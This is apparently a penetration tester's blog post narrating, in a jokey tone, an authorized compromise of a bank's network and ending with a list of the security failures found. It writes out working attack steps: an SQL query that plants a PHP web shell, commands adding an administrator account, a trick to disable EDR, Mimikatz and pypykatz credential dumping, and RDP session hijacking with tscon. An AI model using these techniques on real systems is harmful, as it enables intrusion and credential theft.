---
title: "How to Own a Bank"
author: "Jamie Warren Philippe"
date: "2025-02-13"
categories: [Cybersecurity, Pentest, Story, Banking]
tags: [Core, Banking, Privilege Escalation, Exploitation]
---

# From Directory Listing to Owning a Bank: A Wild Ride with phpMyAdmin, XAMPP, and a PAM that Didn't Give a Damn

## The Setup: "Oops, We Left Everything Open"
So there I was, minding my own business (aka breaking into a bank’s network for *totally legal* reasons), when I stumbled upon a webserver running XAMPP on a **fully patched** Windows Server. At first, I thought, "Okay, maybe they actually know what they're doing." Then, I ran `dirb` and found *directory listing* enabled. **Rookie mistake #1.**

### Step 1: The Accidental Gift – Directory Listing
It all started with a simple directory listing. Because why secure your webserver when you can just hand out your internal file structure to anyone with an internet connection? I ran:
```bash
dirb http://targetbank.com/
```
Boom. A treasure trove of exposed files, including a /phpmyadmin/ folder. Classic.
and I was in. **Rookie mistake #2.**

### Step 2: Oh Look, PhpMyAdmin – Let’s Try Defaults and give them a supprise!
I took a gamble and tried the usual default credentials:
```
Username: root
Password: (blank)
```
Guess what? It worked. Because, of course, it did. 
With full control over the database, I simply used `SELECT INTO OUTFILE` to write a **PHP web shell** directly into `htdocs`.
```sql
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE 'C:/xampp/htdocs/shell.php';
```
Boom. Webshell live at `http://bankserver/shell.php`.

### Step 3: Making Myself at Home (Persistence 101)
Checking the privileges, I realized XAMPP was running under NT AUTHORITY\SYSTEM. Oh, this was going to be fun.**Rookie mistake #3.**
And also, I wasn’t about to leave this beautiful new playground unprotected. So, using my webshell, I ran:
```bash
curl "http://targetbank.com/shell.php?cmd=net user pentester mysecurepassword /add"
curl "http://targetbank.com/shell.php?cmd=net localgroup administrators pentester /add"
```
BOOOOM!!! Hello, new local admin user.

### Step 4: Fighting Cylance EDR (and Winning)
This is where things got even funnier. Every time I tried to run **Mimikatz**, Cylance EDR slapped me like an overprotective parent. So I tried stopping the service:
```bash
sc stop Cylance
```
*Cylance:* "LOL, you thought." The service was marked **non-stoppable.**

But guess what? I could still **change the startup type**:
```bash
sc config Cylance start= demand
```
Now, I just needed to **reboot the server.** I used the good old "extended ping" trick to monitor when it was back:
```bash
ping -t bankserver
```
As soon as it came online, I refreshed my webshell. This time, **Mimikatz worked like a charm.**
With Mimikatz, I dumped the LSASS, downloaded it for offline paswword cracking, 
```bash
mimikatz# sekurlsa::minidump lsass.dmp
```

### Step 5: RDP and Session Hijacking
Since this part now fell under the the greybox part of the assessment, I politely (read: strategically) asked them to allow my RDP traffic through the firewall. Once I was in, I used the persistent account I had created earlier:

```bash
rdesktop -u pentester -p mysecurepassword targetbank.com
```
Once in, I used **PsExec** to elevate myself to SYSTEM:

```bash
PsExec.exe -s -i cmd.exe
```
And ran:
```bash
query session
```
Guess what? **Administrator** left their session inactive but open. **Rookie mistake #4.**
I could not let it like this without Hijacking it.

```bash
tscon 2 /dest:console
```
And boom—Administrator session hijacked. But then… poof! I got kicked out. For some obscure reason, my session got terminated. Maybe someone noticed, maybe it was just dumb luck, but I had to go back to my LSASS dump.

So, I cracked the dump offline:
```bash
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" exit
```
or using Linux:

```bash
pypykatz lsa minidump lsass.dmp
```
And got creds for BankAdmin1, a local admin account used on multiple critical servers.(because why follow best practices, right?)

### Step 6: The Domain Controller & The CyberArk "PAM" Disaster
While moving laterally, I hit the **Domain Controller.** This is where things took an unexpected turn. I also found a **network-mounted drive** on the initial compromised machine containing **a plaintext file with a URL to their PAM (CyberArk).** 🤦

So, being the responsible hacker I am, I:
    - Used the credentials obtained from LSASS dump cracking.
    - Logged into the Domain Controller.
    - Created a domain admin account.
    - Added special permissions to that account to be able to use the PAM.


Then I logged into **CyberArk** with my shiny new domain admin account, and... oh boy. **It gave me access to the core banking system.** 
Because why have proper access controls when you can just let your pentester waltz right in?

*Insert evil laughter here.*

## The Aftermath
At this point, I basically had the **keys to the kingdom.** This entire chain of failures was due to a mix of:
1. **Directory listing enabled**
2. **phpMyAdmin with default creds**
3. **XAMPP running as SYSTEM**
4. **EDR that I could disable with a simple restart**
5. **A bank that stored their own security tool URLs in a plaintext file**
6. **Domain-wide local admin credentials**

**If this wasn’t a real pentest, it would have made a fantastic heist movie.**

## Moral of the Story: 
Secure your systems, disable default credentials, and please don’t leave your privileged accounts lying around. Otherwise, you’ll end up reading about your security failures in a blog post like this. 😏